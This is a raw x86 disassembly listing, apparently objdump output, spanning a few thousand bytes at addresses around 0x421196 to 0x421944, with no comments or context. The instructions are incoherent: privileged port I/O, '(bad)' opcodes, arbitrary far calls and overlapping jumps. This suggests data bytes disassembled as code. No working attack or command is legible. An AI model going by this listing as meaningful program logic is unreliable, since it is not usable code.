  421196:	in     eax,0xc7
  421198:	shl    ah,0x12
  42119b:	add    esi,DWORD PTR [ebx+0x530907b1]
  4211a1:	sub    BYTE PTR [eax-0x38181ca],ah
  4211a7:	aad    0xf8
  4211a9:	stos   BYTE PTR es:[edi],al
  4211aa:	adc    al,0xaf
  4211ac:	or     BYTE PTR [ebx-0x211f176],al
  4211b2:	pop    ss
  4211b3:	push   edx
  4211b4:	xor    al,0xd6
  4211b6:	adc    eax,DWORD PTR [esp+edi*4]
  4211b9:	jmp    0x4211bb
  4211bb:	dec    edx
  4211bc:	rcl    DWORD PTR [ebx+eax*4],0x84
  4211c0:	pop    edi
  4211c1:	jo     0x421207
  4211c3:	test   eax,0x587115d5
  4211c8:	not    edx
  4211ca:	out    dx,eax
  4211cb:	ret    
  4211cc:	xchg   ebp,eax
  4211cd:	or     al,0x6d
  4211cf:	jg     0x42122e
  4211d1:	cwde   
  4211d2:	scas   eax,DWORD PTR es:[edi]
  4211d3:	or     al,0x89
  4211d5:	inc    esp
  4211d6:	sub    BYTE PTR [edx],ah
  4211d8:	(bad)  
  4211d9:	in     al,0x29
  4211db:	frstor [edi+edi*1]
  4211de:	pop    edi
  4211df:	dec    ebx
  4211e0:	or     BYTE PTR [eax+0x70],dl
  4211e3:	enter  0x71a9,0xfb
  4211e7:	or     eax,edi
  4211e9:	sbb    DWORD PTR [eax+edx*4-0x20],esi
  4211ed:	mov    esi,0x9c918b17
  4211f2:	inc    ebx
  4211f3:	addr16 iret 
  4211f5:	ds adc ch,bl
  4211f8:	adc    BYTE PTR [esi],dl
  4211fa:	lods   eax,DWORD PTR ds:[esi]
  4211fb:	push   esi
  4211fc:	sub    eax,0xe4f86e7
  421201:	jp     0x4211ca
  421203:	and    DWORD PTR [edx+ecx*2-0x67],esp
  421207:	jecxz  0x42126b
  421209:	pop    es
  42120a:	es popa 
  42120c:	mov    DWORD PTR [ecx+eax*8+0x6a4d0676],esp
  421213:	into   
  421214:	je     0x421227
  421216:	test   DWORD PTR [edi],esp
  421218:	dec    edi
  421219:	jno    0x421215
  42121b:	sbb    eax,0xb7d5d033
  421220:	cdq    
  421221:	je     0x421231
  421223:	sbb    BYTE PTR [esi+0x4c3457c3],dl
  421229:	mov    dh,BYTE PTR ss:[ebp+0x32252c25]
  421230:	and    BYTE PTR [edx],al
  421232:	gs xchg esp,eax
  421234:	in     al,0x29
  421236:	ja     0x42120d
  421238:	cdq    
  421239:	push   ds
  42123a:	lods   al,BYTE PTR ds:[esi]
  42123b:	(bad)  
  42123c:	daa    
  42123d:	push   esi
  42123e:	sbb    DWORD PTR [ecx+ebp*2-0x5d],ebp
  421242:	mov    dh,0x3d
  421244:	cmp    ecx,DWORD PTR [edx+0x39]
  421247:	add    al,0x75
  421249:	arpl   WORD PTR ds:[edi],bx
  42124c:	cs dec edx
  42124e:	loope  0x421245
  421250:	add    edi,DWORD PTR ds:0x9ec1f35c
  421256:	jl     0x4212a0
  421258:	lock fistp DWORD PTR [edi]
  42125b:	imul   esp,edx,0x15
  42125e:	jns    0x421226
  421260:	iret   
  421261:	fist   DWORD PTR [ebx+0x13cc5ac1]
  421267:	mov    bh,0x1a
  421269:	out    0x21,al
  42126b:	stos   BYTE PTR es:[edi],al
  42126c:	push   edx
  42126d:	adc    BYTE PTR [ebp+0x42],dl
  421270:	mov    ds:0xf93df4b5,eax
  421275:	inc    edi
  421276:	mov    BYTE PTR [edx],ch
  421278:	sti    
  421279:	les    ebx,FWORD PTR [edx]
  42127b:	hlt    
  42127c:	and    al,0xb6
  42127e:	popf   
  42127f:	lods   al,BYTE PTR ds:[esi]
  421280:	sub    dl,dh
  421282:	ds inc ebx
  421284:	cld    
  421285:	mov    ebx,DWORD PTR [edi-0x73]
  421288:	popf   
  421289:	ins    BYTE PTR es:[edi],dx
  42128a:	sub    eax,DWORD PTR [ecx]
  42128c:	mov    eax,ds:0x25b6f16b
  421291:	xchg   edi,eax
  421292:	lea    esi,[edi+edi*1-0x2dabaf72]
  421299:	or     eax,0xbb9134af
  42129e:	and    DWORD PTR [eax+0x3b],eax
  4212a1:	adc    al,0x67
  4212a3:	scas   eax,DWORD PTR es:[edi]
  4212a4:	dec    edi
  4212a5:	push   es
  4212a6:	daa    
  4212a7:	and    al,0xcf
  4212a9:	out    0x1e,eax
  4212ab:	hlt    
  4212ac:	loopne 0x4212fc
  4212ae:	xchg   ecx,eax
  4212af:	adc    BYTE PTR [edi-0x74],ch
  4212b2:	xor    eax,DWORD PTR [edx+0x3c402f2e]
  4212b8:	in     al,0xb4
  4212ba:	inc    ebp
  4212bb:	(bad)  
  4212bc:	xor    ebp,ebp
  4212be:	aas    
  4212bf:	mov    bh,BYTE PTR [ecx+eax*1]
  4212c2:	jnp    0x421326
  4212c4:	aad    0xd1
  4212c6:	mov    WORD PTR [edi-0x70346e57],cs
  4212cc:	push   ecx
  4212cd:	pop    ebx
  4212ce:	shr    DWORD PTR [edx-0x5f40fd8d],0x74
  4212d5:	sbb    edi,DWORD PTR [ecx-0x47]
  4212d8:	mov    eax,ds:0xc2dbb5a1
  4212dd:	fild   WORD PTR [esi]
  4212df:	ficom  DWORD PTR [ecx+0x34a35d22]
  4212e5:	mov    BYTE PTR [eax+0x1e12ff73],bh
  4212eb:	lods   eax,DWORD PTR ds:[esi]
  4212ec:	das    
  4212ed:	sbb    BYTE PTR [edi-0x6dae13a2],bh
  4212f3:	push   ebx
  4212f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212f5:	xchg   edx,eax
  4212f6:	mov    ah,BYTE PTR [eax]
  4212f8:	jo     0x421280
  4212fa:	outs   dx,BYTE PTR ds:[esi]
  4212fb:	push   eax
  4212fc:	lahf   
  4212fd:	sub    edi,DWORD PTR [esi]
  4212ff:	shl    DWORD PTR [edx-0x7b],cl
  421302:	idiv   BYTE PTR [edx-0x5272dab]
  421308:	xor    DWORD PTR ds:0x549e63b6,ebx
  42130e:	dec    ebx
  42130f:	mov    eax,0x279dc860
  421314:	pop    edi
  421315:	test   BYTE PTR [esi-0x44a5c1d3],cl
  42131b:	add    BYTE PTR [edi+0x22dfc3ae],bl
  421321:	pop    ecx
  421322:	rcl    DWORD PTR [edi-0x6bebd1f8],1
  421328:	push   ebx
  421329:	sbb    al,0x3
  42132b:	(bad)  
  42132c:	and    al,al
  42132e:	(bad)  
  42132f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421330:	cli    
  421331:	xchg   edi,eax
  421332:	cdq    
  421333:	inc    ebp
  421334:	pop    ds
  421335:	mov    bh,0xe9
  421337:	imul   ecx,DWORD PTR [edi],0x6c
  42133a:	ret    0x7909
  42133d:	xchg   ecx,eax
  42133e:	mov    eax,0x75c7f62a
  421343:	inc    ecx
  421344:	inc    eax
  421345:	ja     0x4213ad
  421347:	mov    ds:0x5841af53,eax
  42134c:	lods   al,BYTE PTR ds:[esi]
  42134d:	idiv   BYTE PTR [edx]
  42134f:	mov    bl,0x1b
  421351:	mov    ebx,0x1dc949d3
  421356:	adc    esp,DWORD PTR [edi+ebp*1]
  421359:	cmp    BYTE PTR [ecx-0x5c],bh
  42135c:	add    ah,bh
  42135e:	jo     0x4213d3
  421360:	and    al,BYTE PTR [ebx+0x85be65e]
  421366:	pop    edx
  421367:	dec    esp
  421368:	mov    ecx,0x3e7a9ead
  42136d:	push   ss
  42136e:	fisttp DWORD PTR [edi+0x2dd24fc5]
  421374:	sbb    eax,0x40dba70a
  421379:	aaa    
  42137a:	and    eax,0x108e0168
  42137f:	js     0x42132d
  421381:	into   
  421382:	jo     0x4213c1
  421384:	cmp    esp,DWORD PTR [edi+0x58]
  421387:	or     al,0xdc
  421389:	rcl    DWORD PTR [ebx],cl
  42138b:	(bad)  
  42138d:	aam    0xc4
  42138f:	add    al,0x9e
  421391:	jae    0x421373
  421393:	mov    ch,BYTE PTR [ebp+0x791504e7]
  421399:	pop    edi
  42139a:	daa    
  42139b:	out    dx,eax
  42139c:	into   
  42139d:	mov    ecx,0x3ef86565
  4213a2:	and    al,0x8
  4213a4:	push   ebx
  4213a5:	cdq    
  4213a6:	mov    ebx,0xd9bb81b5
  4213ab:	sub    al,bl
  4213ad:	inc    ebx
  4213ae:	xlat   BYTE PTR ds:[ebx]
  4213af:	and    BYTE PTR [esi+0x16],dl
  4213b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213b3:	sbb    al,0x4b
  4213b5:	ret    0xd033
  4213b8:	xchg   esi,eax
  4213b9:	sub    BYTE PTR [ebp+0x6f],bl
  4213bc:	mulps  xmm4,XMMWORD PTR [eax-0x145f921a]
  4213c3:	xchg   edx,eax
  4213c4:	or     DWORD PTR cs:[edi],edx
  4213c7:	mov    eax,0xa7be8212
  4213cc:	push   0x63a4b0c0
  4213d1:	fmulp  st(1),st
  4213d3:	or     cl,dh
  4213d5:	mov    ah,0xfa
  4213d7:	or     ecx,ebp
  4213d9:	pop    eax
  4213da:	outs   dx,BYTE PTR ds:[esi]
  4213db:	sbb    dh,BYTE PTR [esi-0x61]
  4213de:	inc    esp
  4213df:	cmp    al,0x1a
  4213e1:	fbstp  TBYTE PTR [esi+0x4d]
  4213e4:	mov    edx,0x3254aebc
  4213e9:	pop    esi
  4213ea:	out    0xfb,eax
  4213ec:	sub    DWORD PTR [edi],ebp
  4213ee:	cmp    ebp,DWORD PTR [eax]
  4213f0:	add    cl,dh
  4213f2:	fisubr WORD PTR [edi*2+0x703df4a1]
  4213f9:	dec    ecx
  4213fa:	mov    ebx,DWORD PTR [ebx]
  4213fc:	ret    
  4213fd:	jne    0x421396
  4213ff:	push   edx
  421400:	jg     0x421443
  421402:	jo     0x42144e
  421404:	int3   
  421405:	dec    eax
  421406:	mov    esi,0x8804a2d9
  42140b:	jns    0x42146a
  42140d:	out    0x7f,al
  42140f:	push   ss
  421410:	in     al,dx
  421411:	cmp    BYTE PTR [eax-0x31],ch
  421414:	aad    0x51
  421416:	in     eax,0xa1
  421418:	lods   eax,DWORD PTR ds:[esi]
  421419:	ret    0x1beb
  42141c:	adc    ch,ah
  42141e:	xchg   esi,eax
  42141f:	popa   
  421420:	icebp  
  421421:	pop    ebx
  421422:	mov    ah,0x13
  421424:	pop    eax
  421425:	inc    eax
  421426:	dec    DWORD PTR [ebx+0x6c]
  421429:	(bad)  
  42142a:	out    0xf1,al
  42142c:	bound  esp,QWORD PTR [ecx]
  42142e:	popf   
  42142f:	call   0xdb9a326c
  421434:	call   0xfec127a6
  421439:	icebp  
  42143a:	in     al,0xf8
  42143c:	pop    esp
  42143d:	pop    ecx
  42143e:	test   eax,0xee31daa9
  421443:	xor    eax,0x8c2e2e35
  421448:	and    eax,0x2c117b7a
  42144d:	rol    BYTE PTR ds:0xea049210,1
  421453:	xchg   ecx,eax
  421454:	jae    0x42146f
  421456:	xchg   edi,eax
  421457:	cmp    eax,0x760ac80c
  42145c:	mov    ebp,0x427fa482
  421461:	mov    WORD PTR [edx+edi*4+0x37],ss
  421465:	sbb    ch,BYTE PTR [esi+0x3]
  421468:	and    dl,bh
  42146a:	push   0xbd654f8a
  42146f:	sub    al,0x73
  421471:	imul   ebx,DWORD PTR [eax],0x2ef1526e
  421477:	clc    
  421478:	stos   BYTE PTR es:[edi],al
  421479:	cwde   
  42147a:	and    DWORD PTR [ecx-0x431063f9],ebp
  421480:	cmp    ebx,DWORD PTR [ecx]
  421482:	add    DWORD PTR [ebp-0x5e270cff],0x953f6bdb
  42148c:	add    al,0xe9
  42148e:	(bad)  
  42148f:	out    dx,al
  421490:	xor    bh,BYTE PTR [ebx]
  421492:	imul   esp,DWORD PTR [edi+0x16],0x19
  421496:	pop    ecx
  421497:	jmp    0x4214d2
  421499:	loop   0x42146d
  42149b:	dec    eax
  42149c:	jle    0x421464
  42149e:	xchg   edx,eax
  42149f:	(bad)  
  4214a0:	out    0x99,eax
  4214a2:	icebp  
  4214a3:	inc    ecx
  4214a4:	push   edi
  4214a5:	or     ebx,ebp
  4214a7:	aaa    
  4214a8:	add    ch,BYTE PTR [edx+0x7961c0eb]
  4214ae:	adc    DWORD PTR [edi-0x26639afa],esi
  4214b4:	stos   BYTE PTR es:[edi],al
  4214b5:	scas   al,BYTE PTR es:[edi]
  4214b6:	adc    BYTE PTR [eax],0x45
  4214b9:	sbb    eax,0x4d354b7d
  4214be:	or     BYTE PTR [edx-0xa501007],0xec
  4214c5:	jno    0x421492
  4214c7:	push   esp
  4214c8:	aas    
  4214c9:	addr16 stc 
  4214cb:	xor    eax,0xb82421c1
  4214d0:	mov    esi,0x255ce518
  4214d5:	inc    ebx
  4214d6:	cli    
  4214d7:	aam    0x56
  4214d9:	popa   
  4214da:	push   es
  4214db:	mov    al,BYTE PTR [eax+0x78]
  4214de:	jle    0x42146b
  4214e0:	pop    es
  4214e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214e2:	sub    edi,DWORD PTR [ebx-0x32]
  4214e5:	pop    esp
  4214e6:	mov    ecx,0x7397fb87
  4214eb:	mov    al,ds:0x9a0a4f08
  4214f0:	mov    ecx,0x5630a174
  4214f5:	outs   dx,BYTE PTR ds:[esi]
  4214f6:	fmul   st,st(7)
  4214f8:	xchg   edi,eax
  4214f9:	jmp    0xfd2d8310
  4214fe:	mov    eax,0x6166bebb
  421503:	es mov cl,0x92
  421506:	out    0x5f,eax
  421508:	or     bh,BYTE PTR [esi-0x122b7fb3]
  42150e:	aaa    
  42150f:	adc    ecx,DWORD PTR [ecx+ebp*8-0x47]
  421513:	mov    ah,0x8a
  421515:	das    
  421516:	test   eax,0x37df11a6
  42151b:	cmp    al,0xde
  42151d:	mov    DWORD PTR ds:0x3393dbd9,eax
  421523:	push   esi
  421524:	scas   al,BYTE PTR es:[edi]
  421525:	ret    0xe61a
  421528:	inc    edx
  421529:	mov    BYTE PTR [edx-0x77],cl
  42152c:	fcom   DWORD PTR [ecx-0x53]
  42152f:	push   eax
  421530:	dec    eax
  421531:	xchg   ebx,eax
  421532:	inc    ebp
  421533:	xor    BYTE PTR [edi],cl
  421535:	jbe    0x4214f8
  421537:	sub    DWORD PTR [edx],0x68eaaf2d
  42153d:	jo     0x4214e7
  42153f:	mov    cl,0xf8
  421541:	pushf  
  421542:	arpl   WORD PTR [edi],dx
  421544:	repnz sti 
  421546:	inc    esp
  421547:	das    
  421548:	or     al,BYTE PTR [esi]
  42154a:	ds xchg ebx,eax
  42154c:	aad    0x8d
  42154e:	imul   esp,DWORD PTR [ebp+ebx*8-0x37],0x8c078328
  421556:	test   eax,0xda3c9d9e
  42155b:	test   BYTE PTR [edx],ch
  42155d:	out    0x1b,eax
  42155f:	push   eax
  421560:	shl    BYTE PTR [eax-0xe370704],1
  421566:	xchg   ebx,eax
  421567:	dec    esi
  421568:	fs push ecx
  42156a:	sar    ecx,cl
  42156c:	push   es
  42156d:	iret   
  42156e:	(bad)  
  421570:	xor    bh,0xc
  421573:	jno    0x421543
  421575:	lods   al,BYTE PTR ds:[esi]
  421576:	pop    esp
  421577:	stos   DWORD PTR es:[edi],eax
  421578:	pop    ebx
  421579:	xchg   DWORD PTR [esi],ebp
  42157b:	sbb    esp,esi
  42157d:	ror    BYTE PTR [edx],0x76
  421580:	jae    0x4215fd
  421582:	sbb    al,0x8c
  421584:	dec    edi
  421585:	jmp    0x42159c
  421587:	push   esi
  421588:	jmp    0x421516
  42158a:	mov    dh,0x8e
  42158c:	sti    
  42158d:	stos   BYTE PTR es:[edi],al
  42158e:	aad    0x6e
  421590:	hlt    
  421591:	adc    eax,0x2c5574e7
  421596:	sub    al,0x7b
  421598:	sub    esi,DWORD PTR [ebp+0x5727a62b]
  42159e:	inc    ebx
  42159f:	sub    eax,0xc7132740
  4215a4:	dec    BYTE PTR [edi-0x58]
  4215a7:	and    DWORD PTR [ebp-0x1],edx
  4215aa:	shl    BYTE PTR [esi],cl
  4215ac:	retf   0x810
  4215af:	mov    WORD PTR gs:[edi-0x2883b64e],cs
  4215b6:	lods   al,BYTE PTR ds:[esi]
  4215b7:	cmp    eax,0xcc951831
  4215bc:	rcr    DWORD PTR [edx+0x610f44b],cl
  4215c2:	jg     0x4215d8
  4215c4:	das    
  4215c5:	lea    eax,[ebx-0x72]
  4215c8:	dec    ecx
  4215c9:	push   ecx
  4215ca:	mov    esp,0x7d9e22f3
  4215cf:	ins    BYTE PTR es:[edi],dx
  4215d0:	popa   
  4215d1:	icebp  
  4215d2:	loopne 0x42158d
  4215d4:	and    eax,0xeb4bd5e3
  4215d9:	jns    0x4215f9
  4215db:	mov    cl,0xb
  4215dd:	je     0x4215af
  4215df:	cs jl  0x4215c7
  4215e2:	les    esi,FWORD PTR [esi-0x7500d31a]
  4215e8:	jae    0x4215a5
  4215ea:	mov    ecx,0x56c895a9
  4215ef:	pop    ebx
  4215f0:	jb     0x42157d
  4215f2:	xlat   BYTE PTR ds:[ebx]
  4215f3:	popa   
  4215f4:	jnp    0x4215c6
  4215f6:	mov    ds:0xb5b66e51,eax
  4215fb:	fst    st(6)
  4215fd:	aas    
  4215fe:	mov    BYTE PTR [eax-0x4f],bl
  421601:	mov    esi,0x514d32e3
  421606:	shl    BYTE PTR [edi+0x49],1
  421609:	loop   0x4215e9
  42160b:	xchg   edx,eax
  42160c:	sbb    DWORD PTR [ebp+eax*8-0x754a4862],ecx
  421613:	shr    ebp,1
  421615:	sbb    dl,BYTE PTR [edx-0x28]
  421618:	(bad)  
  421619:	xor    DWORD PTR [ecx+0x17342979],ecx
  42161f:	dec    eax
  421620:	mov    al,ds:0x5c063762
  421625:	pop    esi
  421626:	inc    ebp
  421627:	sbb    al,0xad
  421629:	frstor [ecx]
  42162b:	hlt    
  42162c:	aaa    
  42162d:	loopne 0x421649
  42162f:	add    BYTE PTR [esi+ebp*2+0x345c3942],dh
  421636:	jmp    0x8b34d237
  42163b:	fild   DWORD PTR [eax]
  42163d:	mov    dl,0x51
  42163f:	mov    ebp,0x178f6b48
  421644:	rcl    BYTE PTR [eax],1
  421646:	mov    al,0x37
  421648:	jb     0x42168f
  42164a:	(bad)  
  42164b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42164c:	sub    eax,0x81a83fd4
  421651:	push   cs
  421652:	xchg   edi,eax
  421653:	mov    esi,0x46a4cbd
  421658:	mov    ecx,0x77fcc839
  42165d:	cmp    al,0x2
  42165f:	xchg   edx,eax
  421660:	push   ds
  421661:	xchg   ebp,eax
  421662:	shr    DWORD PTR [ebx+0x42],cl
  421665:	mov    bl,ch
  421667:	sti    
  421668:	jmp    0x4b55:0x34565dfc
  42166f:	cs into 
  421671:	mul    BYTE PTR [ecx]
  421673:	loope  0x4216c4
  421675:	lods   al,BYTE PTR ds:[esi]
  421676:	jne    0x42169f
  421678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421679:	xchg   ebx,eax
  42167a:	mov    edx,edx
  42167c:	sti    
  42167d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42167e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42167f:	jge    0x42160f
  421681:	sbb    eax,0xe14b9b56
  421686:	imul   ebx,edi,0x14
  421689:	jmp    0x4216e9
  42168b:	stc    
  42168c:	fbstp  TBYTE PTR [edi-0xd]
  42168f:	or     DWORD PTR [esi+0xb891df],0x794a665b
  421699:	shl    al,cl
  42169b:	lods   al,BYTE PTR ds:[esi]
  42169c:	rcr    DWORD PTR [edx],cl
  42169e:	lea    edx,[ebx+0x21]
  4216a1:	cmp    DWORD PTR [ecx-0x5ea3ff7c],0xc186a336
  4216ab:	sub    al,0xe7
  4216ad:	dec    esp
  4216ae:	mov    edx,0x16e09368
  4216b3:	ins    DWORD PTR es:[edi],dx
  4216b4:	jbe    0x421678
  4216b6:	sbb    DWORD PTR [eax+0x26882b05],esi
  4216bc:	add    esp,DWORD PTR [eax-0x3b]
  4216bf:	adc    al,0x2b
  4216c1:	cmp    ah,BYTE PTR [ecx-0x52]
  4216c4:	popf   
  4216c5:	das    
  4216c6:	pop    esp
  4216c7:	imul   ebp,ecx,0xd6faa1a7
  4216cd:	jns    0x4216ad
  4216cf:	aam    0x88
  4216d1:	iret   
  4216d2:	call   0xd332:0xc5f9ea20
  4216d9:	stc    
  4216da:	leave  
  4216db:	mov    edx,0x61b5918
  4216e0:	out    dx,al
  4216e1:	xchg   esi,eax
  4216e2:	imul   ecx,edx,0x31
  4216e5:	mov    ds:0x4aa60cf4,al
  4216ea:	pop    ebp
  4216eb:	sar    BYTE PTR [esi+0x6222473b],1
  4216f1:	fcmove st,st(2)
  4216f3:	outs   dx,BYTE PTR ds:[esi]
  4216f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216f5:	add    edx,eax
  4216f7:	dec    eax
  4216f8:	jp     0x421743
  4216fa:	push   ss
  4216fb:	sbb    al,dh
  4216fd:	les    esp,FWORD PTR [ecx-0x30]
  421700:	mov    WORD PTR [eax-0x2611c6be],?
  421706:	nop
  421707:	pop    esp
  421708:	jmp    FWORD PTR [edi]
  42170a:	adc    ch,dl
  42170c:	xor    eax,0x94fce4ef
  421711:	mov    WORD PTR [ebx-0x59],?
  421714:	fwait
  421715:	rcl    ebp,1
  421717:	pushf  
  421718:	jp     0x421757
  42171a:	push   DWORD PTR [ebx-0xa80bab2]
  421720:	(bad)  
  421721:	aad    0x82
  421723:	pop    esi
  421724:	jg     0x421711
  421726:	call   0xf5f8:0xee986bfc
  42172d:	sbb    ah,BYTE PTR [esi-0x7abe1337]
  421733:	jp     0x4216c7
  421735:	std    
  421736:	xchg   BYTE PTR [ecx-0x6b],dl
  421739:	dec    edi
  42173a:	add    eax,0x7bacb862
  42173f:	cmc    
  421740:	sub    BYTE PTR [eax],al
  421742:	cwde   
  421743:	mov    al,BYTE PTR [ebx+ebx*8+0x4707462e]
  42174a:	shl    BYTE PTR [ebx+0x510d5219],1
  421750:	xchg   BYTE PTR ds:0xd85d1c07,dh
  421756:	sbb    bl,BYTE PTR [esi-0x17d39bc8]
  42175c:	xor    al,0xf6
  42175e:	pop    ecx
  42175f:	fimul  DWORD PTR [edx]
  421761:	mov    esi,DWORD PTR [edi+0x6dd130fb]
  421767:	jno    0x421769
  421769:	cmc    
  42176a:	dec    esi
  42176b:	cmp    eax,DWORD PTR [edx]
  42176d:	mov    ah,0x9f
  42176f:	and    ebp,DWORD PTR [eax+0x3e]
  421772:	test   al,0x4c
  421774:	pushf  
  421775:	out    0xdb,al
  421777:	out    dx,eax
  421778:	(bad)  
  421779:	xchg   esi,eax
  42177a:	jb     0x421788
  42177c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42177d:	lds    edx,FWORD PTR ss:[eax-0x14]
  421781:	ret    
  421782:	fldenv [edx+0x5]
  421785:	test   BYTE PTR [ebp+0x1b],cl
  421788:	sub    BYTE PTR [esi+ebx*1+0x45bbff3],al
  42178f:	mov    ebx,0x49b734f1
  421794:	stc    
  421795:	xchg   edi,eax
  421796:	jns    0x421757
  421798:	inc    edi
  421799:	sbb    ecx,eax
  42179b:	repnz retf 0xffe7
  42179f:	push   ds
  4217a0:	inc    edi
  4217a1:	clc    
  4217a2:	pextrw edi,(bad),0xc5
  4217a4:	cmp    BYTE PTR [ecx-0x53],dl
  4217a7:	inc    eax
  4217a8:	repz cmp DWORD PTR [edx+eiz*8-0x23f89d5d],ebp
  4217b0:	pop    eax
  4217b1:	mov    DWORD PTR [edx+0x78],ebp
  4217b4:	data16 sub dl,BYTE PTR [ecx-0x73]
  4217b8:	call   0x5862:0x3377f988
  4217bf:	scas   eax,DWORD PTR es:[edi]
  4217c0:	dec    ebp
  4217c1:	fmul   st,st(2)
  4217c3:	fs push ebp
  4217c5:	mov    ch,0x14
  4217c7:	pop    ss
  4217c8:	cmp    eax,0x1c51575a
  4217cd:	mov    al,0xcf
  4217cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217d0:	push   eax
  4217d1:	dec    ebx
  4217d2:	mov    al,ds:0xca3c0b9
  4217d7:	push   edi
  4217d8:	aam    0x29
  4217da:	enter  0x67f0,0x46
  4217de:	dec    edi
  4217df:	mov    ah,0xba
  4217e1:	xchg   DWORD PTR [ebx],ebp
  4217e3:	idiv   DWORD PTR [ecx+0x51421e57]
  4217e9:	mov    eax,0x37c129a7
  4217ee:	dec    edx
  4217ef:	into   
  4217f0:	add    eax,0xc9c932c4
  4217f5:	xchg   edx,eax
  4217f6:	enter  0x3ca0,0x1e
  4217fa:	cs dec esp
  4217fc:	dec    edx
  4217fd:	pop    esp
  4217fe:	fsubr  QWORD PTR [edx+0x16]
  421801:	or     DWORD PTR [ebp-0x3c],esi
  421804:	(bad)  
  421805:	jnp    0x4217e2
  421807:	sbb    eax,0xcca811fa
  42180c:	adc    ebp,DWORD PTR [ecx+0x50]
  42180f:	div    DWORD PTR [edx]
  421811:	mov    eax,ds:0x9dadc0d
  421816:	sub    edx,DWORD PTR [edi]
  421818:	fadd   QWORD PTR [eax+0x2b]
  42181b:	aaa    
  42181c:	push   ss
  42181d:	xchg   esi,eax
  42181e:	pop    ebp
  42181f:	mov    al,ds:0x425ccca1
  421824:	pusha  
  421825:	pop    eax
  421826:	cmp    eax,0x6b703490
  42182b:	repnz enter 0x13b1,0x60
  421830:	mov    dh,cl
  421832:	xor    dh,al
  421834:	push   edx
  421835:	pop    ebp
  421836:	in     eax,0x23
  421838:	scas   al,BYTE PTR es:[edi]
  421839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42183a:	mov    ah,0xd3
  42183c:	xchg   edx,eax
  42183d:	sub    BYTE PTR ds:[ebx+0x289dd93c],dh
  421844:	pop    edi
  421845:	add    eax,0xda2e7fc7
  42184a:	adc    al,0xcd
  42184c:	das    
  42184d:	xlat   BYTE PTR ds:[ebx]
  42184e:	mov    bh,0x94
  421850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421851:	sub    cl,BYTE PTR [ebp-0x5c]
  421854:	cli    
  421855:	xchg   edx,eax
  421856:	and    ah,bh
  421858:	sub    ah,dh
  42185a:	dec    ebx
  42185b:	in     al,dx
  42185c:	and    dl,BYTE PTR fs:[ebp+eax*4-0x5fe85da8]
  421864:	aaa    
  421865:	shl    BYTE PTR [esi+0xa372ac4],0xe6
  42186c:	addr16 out dx,eax
  42186e:	push   edx
  42186f:	pop    ds
  421870:	das    
  421871:	pushf  
  421872:	dec    ebx
  421873:	jl     0x4218dc
  421875:	sub    DWORD PTR [edi],ebx
  421877:	pop    esi
  421878:	leave  
  421879:	outs   dx,BYTE PTR ds:[esi]
  42187a:	cmc    
  42187b:	add    dl,0x7
  42187e:	fisub  DWORD PTR [esp+eax*8+0x21b361ec]
  421885:	mov    ah,0x9f
  421887:	lods   al,BYTE PTR ds:[esi]
  421888:	outs   dx,BYTE PTR ds:[esi]
  421889:	retf   0xc275
  42188c:	retf   
  42188d:	dec    eax
  42188e:	sub    DWORD PTR [ebx+edi*4+0x3e],ecx
  421892:	mov    gs,WORD PTR [ecx*8+0x3167023a]
  421899:	(bad)  
  42189a:	retf   0x24a6
  42189d:	cli    
  42189e:	fst    DWORD PTR [eax]
  4218a0:	cmp    ch,BYTE PTR [ecx-0xecafe8b]
  4218a6:	adc    DWORD PTR [edx+0x7f],0xffffffb9
  4218aa:	ds aaa 
  4218ac:	fcom   QWORD PTR [edx]
  4218ae:	or     esi,DWORD PTR [edx-0x23]
  4218b1:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4218b3:	cs inc edi
  4218b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218b6:	stos   BYTE PTR es:[edi],al
  4218b7:	lahf   
  4218b8:	jle    0x421918
  4218ba:	adc    DWORD PTR [edx+0x2de975f9],edi
  4218c0:	xchg   bl,ch
  4218c2:	ss nop
  4218c4:	in     al,0x32
  4218c6:	test   al,0x2c
  4218c8:	sub    DWORD PTR [ebx-0x3d],eax
  4218cb:	adc    eax,0x569b5683
  4218d0:	nop
  4218d1:	jae    0x42187c
  4218d3:	cli    
  4218d4:	adc    BYTE PTR [edx+0x37],0x8f
  4218d8:	adc    BYTE PTR [esp+edx*4-0x4b],0xc1
  4218dd:	jb     0x4218a4
  4218df:	pop    edx
  4218e0:	xchg   ecx,eax
  4218e1:	xor    al,BYTE PTR [ecx-0x6397f508]
  4218e7:	lds    eax,FWORD PTR [edi+0x3daf1035]
  4218ed:	scas   al,BYTE PTR es:[edi]
  4218ee:	call   0x5e48:0x7edb328a
  4218f5:	sub    BYTE PTR [edx-0x5a3adbc3],0x22
  4218fc:	mov    ecx,0xdff3f77b
  421901:	retf   0x130
  421904:	and    DWORD PTR [edx-0x7db6ba70],ebx
  42190a:	test   BYTE PTR [eax+0x6f],bl
  42190d:	shl    ebp,1
  42190f:	mov    dh,0xb3
  421911:	retf   0xfa7b
  421914:	cmp    DWORD PTR [ecx],edx
  421916:	lods   al,BYTE PTR ds:[esi]
  421917:	jnp    0x4218fc
  421919:	int3   
  42191a:	cmp    eax,0x718c55d7
  42191f:	xchg   ecx,eax
  421920:	cli    
  421921:	cmc    
  421922:	sub    DWORD PTR [ecx-0x7e58a884],edx
  421928:	cmp    eax,0x824c7acd
  42192d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42192e:	wbinvd 
  421930:	pop    edi
  421931:	mov    ecx,0x3b01bb6d
  421936:	ret    
  421937:	push   eax
  421938:	jmp    0x42197c
  42193a:	es jo  0x421902
  42193d:	dec    ecx
  42193e:	or     bh,dl
  421940:	dec    esi
  421941:	sbb    al,0x32
  421943:	dec    edx
  421944:	bound  ebp,QWORD PTR [ebx+ecx*8+0x1e11df0b]
